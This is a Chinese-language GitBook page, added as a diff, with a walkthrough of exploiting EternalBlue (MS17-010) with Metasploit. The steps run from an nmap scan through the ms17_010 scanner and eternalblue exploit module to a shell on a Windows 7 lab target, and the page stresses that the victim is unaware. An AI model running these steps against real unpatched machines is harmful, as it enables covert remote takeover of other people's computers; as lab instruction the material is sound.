@@ -1,0 +1,396 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>内网渗透超级好用，永恒之蓝了解一下优雅Exploit远程Windows PC · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-donate/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="ch2_1.html" />
+    
+    
+    <link rel="prev" href="ch2.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    简介
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="ch1.html">
+            
+                <a href="ch1.html">
+            
+                    
+                    网络基础知识
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="ch1_1.html">
+            
+                <a href="ch1_1.html">
+            
+                    
+                    小结
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="ch2.html">
+            
+                <a href="ch2.html">
+            
+                    
+                    Kali渗透测试
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter active" data-level="1.3.1" data-path="ch2_0.html">
+            
+                <a href="ch2_0.html">
+            
+                    
+                    内网渗透超级好用，永恒之蓝了解一下优雅Exploit远程Windows PC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="ch2_1.html">
+            
+                <a href="ch2_1.html">
+            
+                    
+                    利用Metasploit中的Eternalblue和Doublepulsar Exploit远程Windows PC
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="ch3.html">
+            
+                <a href="ch3.html">
+            
+                    
+                    超简单的Kali桌面美化教程
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="ch4.html">
+            
+                <a href="ch4.html">
+            
+                    
+                    梯子服务推荐
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="." >内网渗透超级好用，永恒之蓝了解一下优雅Exploit远程Windows PC</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#&#x5185;&#x7F51;&#x6E17;&#x900F;&#x8D85;&#x7EA7;&#x597D;&#x7528;&#xFF0C;&#x6C38;&#x6052;&#x4E4B;&#x84DD;&#x4E86;&#x89E3;&#x4E00;&#x4E0B;"><b>1. </b>&#x5185;&#x7F51;&#x6E17;&#x900F;&#x8D85;&#x7EA7;&#x597D;&#x7528;&#xFF0C;&#x6C38;&#x6052;&#x4E4B;&#x84DD;&#x4E86;&#x89E3;&#x4E00;&#x4E0B;</a></li><ul><li><span class="title-icon "></span><a href="#eternalblue&#x6F0F;&#x6D1E;&#x4ECB;&#x7ECD;"><b>1.1. </b>Eternalblue&#x6F0F;&#x6D1E;&#x4ECB;&#x7ECD;</a></li><li><span class="title-icon "></span><a href="#&#x9A6C;&#x4E0A;&#x5F00;&#x59CB;&#x6211;&#x4EEC;&#x7684;&#x6559;&#x7A0B;"><b>1.2. </b>&#x9A6C;&#x4E0A;&#x5F00;&#x59CB;&#x6211;&#x4EEC;&#x7684;&#x6559;&#x7A0B;</a></li><li><span class="title-icon "></span><a href="#&#x6211;&#x4EEC;&#x4F7F;&#x7528;nmap&#x6765;&#x626B;&#x63CF;&#x4E00;&#x4E0B;victim&#x7684;&#x7AEF;&#x53E3;&#x72B6;&#x6001;"><b>1.3. </b>&#x6211;&#x4EEC;&#x4F7F;&#x7528;nmap&#x6765;&#x626B;&#x63CF;&#x4E00;&#x4E0B;victim&#x7684;&#x7AEF;&#x53E3;&#x72B6;&#x6001;</a></li><li><span class="title-icon "></span><a href="#&#x63A5;&#x7740;&#x52A0;&#x8F7D;msf&#x6846;&#x67B6;&#xFF0C;&#x4F7F;&#x7528;search&#x627E;&#x5230;&#x6709;&#x5173;&#x4E8E;ms17010&#x626B;&#x63CF;&#x6A21;&#x5757;"><b>1.4. </b>&#x63A5;&#x7740;&#x52A0;&#x8F7D;MSF&#x6846;&#x67B6;&#xFF0C;&#x4F7F;&#x7528;search&#x627E;&#x5230;&#x6709;&#x5173;&#x4E8E;MS17_010&#x626B;&#x63CF;&#x6A21;&#x5757;</a></li><li><span class="title-icon "></span><a href="#&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x4F7F;&#x7528;ms17-010&#x6A21;&#x5757;&#x8FDB;&#x884C;&#x6E17;&#x900F;"><b>1.5. </b>&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x4F7F;&#x7528;MS17-010&#x6A21;&#x5757;&#x8FDB;&#x884C;&#x6E17;&#x900F;</a></li></ul></ul></div><a href="#&#x5185;&#x7F51;&#x6E17;&#x900F;&#x8D85;&#x7EA7;&#x597D;&#x7528;&#xFF0C;&#x6C38;&#x6052;&#x4E4B;&#x84DD;&#x4E86;&#x89E3;&#x4E00;&#x4E0B;" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="&#x5185;&#x7F51;&#x6E17;&#x900F;&#x8D85;&#x7EA7;&#x597D;&#x7528;&#xFF0C;&#x6C38;&#x6052;&#x4E4B;&#x84DD;&#x4E86;&#x89E3;&#x4E00;&#x4E0B;"><a name="&#x5185;&#x7F51;&#x6E17;&#x900F;&#x8D85;&#x7EA7;&#x597D;&#x7528;&#xFF0C;&#x6C38;&#x6052;&#x4E4B;&#x84DD;&#x4E86;&#x89E3;&#x4E00;&#x4E0B;" class="anchor-navigation-ex-anchor" href="#&#x5185;&#x7F51;&#x6E17;&#x900F;&#x8D85;&#x7EA7;&#x597D;&#x7528;&#xFF0C;&#x6C38;&#x6052;&#x4E4B;&#x84DD;&#x4E86;&#x89E3;&#x4E00;&#x4E0B;"><i class="fa fa-link" aria-hidden="true"></i></a>1. &#x5185;&#x7F51;&#x6E17;&#x900F;&#x8D85;&#x7EA7;&#x597D;&#x7528;&#xFF0C;&#x6C38;&#x6052;&#x4E4B;&#x84DD;&#x4E86;&#x89E3;&#x4E00;&#x4E0B;</h1>
+<h2 id="eternalblue&#x6F0F;&#x6D1E;&#x4ECB;&#x7ECD;"><a name="eternalblue&#x6F0F;&#x6D1E;&#x4ECB;&#x7ECD;" class="anchor-navigation-ex-anchor" href="#eternalblue&#x6F0F;&#x6D1E;&#x4ECB;&#x7ECD;"><i class="fa fa-link" aria-hidden="true"></i></a>1.1. Eternalblue&#x6F0F;&#x6D1E;&#x4ECB;&#x7ECD;</h2>
+<p>&#x6C38;&#x6052;&#x4E4B;&#x84DD;&#xFF08;&#x82F1;&#x8BED;&#xFF1A;EternalBlue&#xFF09;&#x662F;&#x7F8E;&#x56FD;&#x56FD;&#x5BB6;&#x5B89;&#x5168;&#x5C40;&#x5F00;&#x53D1;&#x7684;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x4E8E;2017&#x5E74;4&#x6708;14&#x65E5;&#x88AB;&#x9ED1;&#x5BA2;&#x7EC4;&#x7EC7;&#x5F71;&#x5B50;&#x63AE;&#x5BA2;&#x6CC4;&#x6F0F;&#x3002;&#x8BE5;&#x5DE5;&#x5177;&#x5229;&#x7528;445/TCP&#x7AEF;&#x53E3;&#x7684;&#x6587;&#x4EF6;&#x5206;&#x4EAB;&#x534F;&#x8BAE;&#x7684;&#x6F0F;&#x6D1E;&#x8FDB;&#x884C;&#x6563;&#x64AD;&#xFF0C;&#x88AB;&#x5F71;&#x54CD;&#x7684;Windows&#x7248;&#x672C;&#x4E0D;&#x8BA1;&#x5176;&#x6570;&#xFF0C;<strong>&#x8BE5;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x4E0D;&#x9700;&#x8981;victim&#x6267;&#x884C;&#x4EFB;&#x4F55;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8FDC;&#x7A0B;&#x63A7;&#x5236;victim&#x7684;&#x7535;&#x8111;</strong></p>
+<h2 id="&#x9A6C;&#x4E0A;&#x5F00;&#x59CB;&#x6211;&#x4EEC;&#x7684;&#x6559;&#x7A0B;"><a name="&#x9A6C;&#x4E0A;&#x5F00;&#x59CB;&#x6211;&#x4EEC;&#x7684;&#x6559;&#x7A0B;" class="anchor-navigation-ex-anchor" href="#&#x9A6C;&#x4E0A;&#x5F00;&#x59CB;&#x6211;&#x4EEC;&#x7684;&#x6559;&#x7A0B;"><i class="fa fa-link" aria-hidden="true"></i></a>1.2. &#x9A6C;&#x4E0A;&#x5F00;&#x59CB;&#x6211;&#x4EEC;&#x7684;&#x6559;&#x7A0B;</h2>
+<p>&#x653B;&#x51FB;&#x8005;&#xFF1A;Kali        IP&#x5730;&#x5740;:192.168.43.196
+victim&#xFF1A;Windows7    IP&#x5730;&#x5740;:192.168.43.14</p>
+<p>&#x8FD9;&#x6B21;&#x6211;&#x4EEC;&#x7528;&#x5230;&#x7684;MS17_010&#x6A21;&#x5757;&#xFF0C;MSF&#x6846;&#x67B6;&#x91CC;&#x9762;&#x5DF2;&#x7ECF;&#x96C6;&#x6210;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x4E0D;&#x9700;&#x8981;&#x624B;&#x52A8;&#x6DFB;&#x52A0;&#x6A21;&#x5757;
+&#x4E0A;&#x8FF0;&#x63D0;&#x5230;&#x6C38;&#x6052;&#x4E4B;&#x84DD;&#x662F;&#x5229;&#x7528;TCP&#x7684;445&#x7AEF;&#x53E3;&#x8FDB;&#x884C;&#x4F20;&#x64AD;&#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x9996;&#x5148;&#x9700;&#x8981;&#x77E5;&#x9053;&#x76EE;&#x6807;&#x662F;&#x5426;&#x5F00;&#x542F;&#x4E86;445&#x7AEF;&#x53E3;&#xFF0C;&#x5728;&#x8FD8;&#x6CA1;&#x6709;&#x6253;&#x4E0A;&#x8865;&#x4E01;&#x4E4B;&#x524D;&#xFF0C;&#x9ED8;&#x8BA4;&#x8BE5;&#x7AEF;&#x53E3;&#x662F;&#x5F00;&#x542F;&#x7684;&#xFF0C;<em>&#x5982;&#x679C;&#x8BE5;&#x7AEF;&#x53E3;&#x6CA1;&#x6709;&#x5F00;&#x542F;&#x4FBF;&#x65E0;&#x6CD5;&#x6E17;&#x900F;&#x6210;&#x529F;</em></p>
+<h2 id="&#x6211;&#x4EEC;&#x4F7F;&#x7528;nmap&#x6765;&#x626B;&#x63CF;&#x4E00;&#x4E0B;victim&#x7684;&#x7AEF;&#x53E3;&#x72B6;&#x6001;"><a name="&#x6211;&#x4EEC;&#x4F7F;&#x7528;nmap&#x6765;&#x626B;&#x63CF;&#x4E00;&#x4E0B;victim&#x7684;&#x7AEF;&#x53E3;&#x72B6;&#x6001;" class="anchor-navigation-ex-anchor" href="#&#x6211;&#x4EEC;&#x4F7F;&#x7528;nmap&#x6765;&#x626B;&#x63CF;&#x4E00;&#x4E0B;victim&#x7684;&#x7AEF;&#x53E3;&#x72B6;&#x6001;"><i class="fa fa-link" aria-hidden="true"></i></a>1.3. &#x6211;&#x4EEC;&#x4F7F;&#x7528;nmap&#x6765;&#x626B;&#x63CF;&#x4E00;&#x4E0B;victim&#x7684;&#x7AEF;&#x53E3;&#x72B6;&#x6001;</h2>
+<pre><code>namp -Pn 192.168.43.14
+</code></pre><p><img src="ch2/0/nmap.png" alt="nmap"></p>
+<p>&#x4ECE;&#x4E0A;&#x8FF0;&#x7684;&#x626B;&#x63CF;&#x7ED3;&#x679C;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x8BE5;&#x4E3B;&#x673A;&#x7684;135,139,<strong>445</strong>&#x7B49;&#x7AEF;&#x53E3;&#x662F;&#x5F00;&#x542F;&#x7684;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6BCF;&#x4E2A;&#x7AEF;&#x53E3;&#x5BF9;&#x5E94;&#x7684;&#x670D;&#x52A1;&#x662F;&#x4EC0;&#x4E48;&#xFF0C;&#x6EE1;&#x8DB3;&#x8BE5;&#x6761;&#x4EF6;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x63A5;&#x7740;&#x6765;&#x626B;&#x63CF;&#x4E00;&#x4E0B;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x662F;&#x5426;&#x6709;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#xFF0C;&#x4E00;&#x822C;445&#x7AEF;&#x53E3;&#x5F00;&#x542F;&#x90FD;&#x4F1A;&#x6EE1;&#x8DB3;</p>
+<h2 id="&#x63A5;&#x7740;&#x52A0;&#x8F7D;msf&#x6846;&#x67B6;&#xFF0C;&#x4F7F;&#x7528;search&#x627E;&#x5230;&#x6709;&#x5173;&#x4E8E;ms17010&#x626B;&#x63CF;&#x6A21;&#x5757;"><a name="&#x63A5;&#x7740;&#x52A0;&#x8F7D;msf&#x6846;&#x67B6;&#xFF0C;&#x4F7F;&#x7528;search&#x627E;&#x5230;&#x6709;&#x5173;&#x4E8E;ms17010&#x626B;&#x63CF;&#x6A21;&#x5757;" class="anchor-navigation-ex-anchor" href="#&#x63A5;&#x7740;&#x52A0;&#x8F7D;msf&#x6846;&#x67B6;&#xFF0C;&#x4F7F;&#x7528;search&#x627E;&#x5230;&#x6709;&#x5173;&#x4E8E;ms17010&#x626B;&#x63CF;&#x6A21;&#x5757;"><i class="fa fa-link" aria-hidden="true"></i></a>1.4. &#x63A5;&#x7740;&#x52A0;&#x8F7D;MSF&#x6846;&#x67B6;&#xFF0C;&#x4F7F;&#x7528;search&#x627E;&#x5230;&#x6709;&#x5173;&#x4E8E;MS17_010&#x626B;&#x63CF;&#x6A21;&#x5757;</h2>
+<pre><code>search ms17_010
+</code></pre><p><img src="ch2/0/ms17.png" alt="nmap"></p>
+<p>&#x4ECE;&#x56FE;&#x7247;&#x4E2D;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;&#x4E00;&#x4E2A;&#x548C;scanner&#x76F8;&#x5173;&#x7684;&#xFF0C;&#x6211;&#x4EEC;&#x9996;&#x5148;&#x4F7F;&#x7528;&#x8BE5;&#x6A21;&#x5757;&#x6765;&#x626B;&#x63CF;&#x4E00;&#x4E0B;</p>
+<pre><code>use auxiliary/scanner/smb/smb_ms17_010
+</code></pre><p>&#x4F7F;&#x7528;&#x8BE5;&#x6A21;&#x5757;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x6765;&#x67E5;&#x770B;&#x4E00;&#x4E0B;&#x76F8;&#x5173;&#x7684;&#x53C2;&#x6570;</p>
+<pre><code>show options
+</code></pre><p><img src="ch2/0/canshu.png" alt="scanner"></p>
+<p>&#x522B;&#x770B;&#x8FD9;&#x4E48;&#x591A;&#x53C2;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x5C31;&#x597D;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x901A;&#x8FC7;RHOSTS&#x53C2;&#x6570;&#x6765;&#x6307;&#x5B9A;&#x6211;&#x4EEC;&#x626B;&#x63CF;&#x7684;&#x5BF9;&#x8C61;&#x662F;&#x8C01;</p>
+<pre><code>set RHOST x.x.x.x
+</code></pre><p><img src="ch2/0/shezhi.png" alt="RHOST"></p>
+<p>&#x63A5;&#x4E0B;&#x6765;</p>
+<pre><code>exploit
+</code></pre><p>&#x6765;&#x6D4B;&#x8BD5;&#x662F;&#x5426;&#x6EE1;&#x8DB3;&#x6761;&#x4EF6;&#xFF0C;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;
+<img src="ch2/0/host.png" alt="exploit"></p>
+<p>&#x4ECE;&#x56FE;&#x7247;&#x4E2D;&#x663E;&#x793A;&#x7684;<strong><em>Host is likely VULNERABLE to MS17-010!</em></strong>&#x53EF;&#x4EE5;&#x5F97;&#x77E5;&#x662F;&#x6EE1;&#x8DB3;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x7684;&#x6761;&#x4EF6;</p>
+<h2 id="&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x4F7F;&#x7528;ms17-010&#x6A21;&#x5757;&#x8FDB;&#x884C;&#x6E17;&#x900F;"><a name="&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x4F7F;&#x7528;ms17-010&#x6A21;&#x5757;&#x8FDB;&#x884C;&#x6E17;&#x900F;" class="anchor-navigation-ex-anchor" href="#&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x4F7F;&#x7528;ms17-010&#x6A21;&#x5757;&#x8FDB;&#x884C;&#x6E17;&#x900F;"><i class="fa fa-link" aria-hidden="true"></i></a>1.5. &#x63A5;&#x7740;&#x6211;&#x4EEC;&#x4F7F;&#x7528;MS17-010&#x6A21;&#x5757;&#x8FDB;&#x884C;&#x6E17;&#x900F;</h2>
+<pre><code>use exploit/windows/smb/ms17_010_eternalblue
+</code></pre><p><img src="ch2/0/ms17-010.png" alt="ms17"></p>
+<p>&#x4E00;&#x6837;&#x5148;&#x67E5;&#x770B;&#x53C2;&#x6570;</p>
+<pre><code>show options
+</code></pre><p><img src="ch2/0/show.png" alt="show options">
+&#x4E5F;&#x4E00;&#x6837;&#x663E;&#x793A;&#x5F88;&#x591A;&#x53C2;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x8FD8;&#x662F;&#x53EA;&#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x90A3;&#x5C31;&#x662F;RHOSTS&#xFF0C;&#x8BE5;&#x53C2;&#x6570;&#x4EE3;&#x8868;victim&#x7684;IP&#x5730;&#x5740;</p>
+<pre><code>set RHOSTS x.x.x.x
+</code></pre><p><img src="ch2/0/rhost.png" alt="IP address">
+&#x8BBE;&#x7F6E;&#x5B8C;&#x6210;&#x4E4B;&#x540E;&#x518D;&#x6765;&#x4E00;&#x6761;</p>
+<pre><code>exploit
+</code></pre><p>&#x51FA;&#x73B0;&#x8BE5;&#x9875;&#x9762;&#x8BF4;&#x660E;&#x6E17;&#x900F;&#x6210;&#x529F;
+<img src="ch2/0/shentou.png" alt="Cpan"></p>
+<p>&#x56FE;&#x7247;&#x4E2D;&#x51FA;&#x73B0;&#x4E86;Windows&#x7CFB;&#x7EDF;&#x624D;&#x4F1A;&#x6709;&#x7684;C&#x76D8;&#xFF0C;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x83B7;&#x53D6;&#x5230;&#x4E86;victim&#x7684;shell&#xFF0C;&#x53EF;&#x4EE5;&#x5BF9;&#x8BE5;&#x7535;&#x8111;&#x5199;&#x5165;&#x6587;&#x4EF6;&#xFF0C;&#x67E5;&#x770B;&#x4FE1;&#x606F;&#x4E4B;&#x7C7B;&#x7684;&#xFF0C;<strong><em>&#x6CE8;&#x610F;&#xFF1A;&#x6B64;&#x65F6;victim&#x662F;&#x6BEB;&#x65E0;&#x5BDF;&#x89C9;&#x7684;&#xFF0C;&#x4E5F;&#x4E0D;&#x9700;&#x8981;&#x7528;&#x6237;&#x6307;&#x5B9A;&#x4EFB;&#x4F55;&#x7684;&#x64CD;&#x4F5C;</em></strong></p>
+<p>&#x6BD4;&#x5982;&#x67E5;&#x770B;victim&#x7528;&#x6237;&#x51E0;&#x4E2A;&#x8D26;&#x6237;</p>
+<p><img src="ch2/0/user.png" alt="Cpan"></p>
+<p>&#x8FD9;&#x4E2A;&#x6559;&#x7A0B;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x8D76;&#x5FEB;&#x52A8;&#x624B;&#x8BD5;&#x8BD5;&#x5427;!</p>
+<p>&#x66F4;&#x591A;&#x4F18;&#x8D28;&#x6E17;&#x900F;&#x6559;&#x7A0B;&#xFF0C;&#x6B22;&#x8FCE;&#x8BBF;&#x95EE;B&#x7AD9;&#xFF0C;&#x6765;&#x5173;&#x6CE8;&#xFF0C;&#x6295;&#x5E01;&#x70B9;&#x8D5E;&#x554A;
+<a href="https://space.bilibili.com/184594996/" title="Bilibili" target="_blank">B&#x7AD9;&#x9891;&#x9053;&#x4F20;&#x9001;&#x95E8;</a></p>
+<p><strong><em>&#x5982;&#x679C;&#x5E2E;&#x52A9;&#x5230;&#x4F60;&#xFF0C;&#x5E0C;&#x671B;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4F60;&#x7684;&#x6253;&#x8D4F;</em></strong></p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="ch2.html" class="navigation navigation-prev " aria-label="Previous page: Kali渗透测试">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="ch2_1.html" class="navigation navigation-next " aria-label="Next page: 利用Metasploit中的Eternalblue和Doublepulsar Exploit远程Windows PC">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"内网渗透超级好用，永恒之蓝了解一下优雅Exploit远程Windows PC","level":"1.3.1","depth":2,"next":{"title":"利用Metasploit中的Eternalblue和Doublepulsar Exploit远程Windows PC","level":"1.3.2","depth":2,"path":"ch2_1.md","ref":"ch2_1.md","articles":[]},"previous":{"title":"Kali渗透测试","level":"1.3","depth":1,"path":"ch2.md","ref":"ch2.md","articles":[{"title":"内网渗透超级好用，永恒之蓝了解一下优雅Exploit远程Windows PC","level":"1.3.1","depth":2,"path":"ch2_0.md","ref":"ch2_0.md","articles":[]},{"title":"利用Metasploit中的Eternalblue和Doublepulsar Exploit远程Windows PC","level":"1.3.2","depth":2,"path":"ch2_1.md","ref":"ch2_1.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["donate","-sharing","sharing-plus","anchor-navigation-ex","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"livereload":{},"search":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"donate":{"alipay":"/Pay/Ali.jpg","alipayText":"支付宝","button":"打赏","title":"","wechat":"/Pay/WeChat.png","wechatText":"微信"},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":true},"sharing":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"anchor-navigation-ex":{"showLevel":true,"associatedWithSummary":true,"printLog":false,"multipleH1":true,"mode":"float","showGoTop":true,"float":{"floatIcon":"fa fa-navicon","showLevelIcon":false,"level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right"},"pageTop":{"showLevelIcon":false,"level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right"}},"variables":{},"gitbook":"*","sharing":{"qq":true,"all":["facebook","google","twitter","weibo","qq","linkedin","qzone","douban"],"douban":false,"facebook":false,"weibo":true,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":true,"linkedin":false}},"file":{"path":"ch2_0.md","mtime":"2019-04-06T15:11:16.247Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-04-06T15:12:09.115Z"},"basePath":".","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="gitbook/gitbook.js"></script>
+    <script src="gitbook/theme.js"></script>
+    
+        
+        <script src="gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
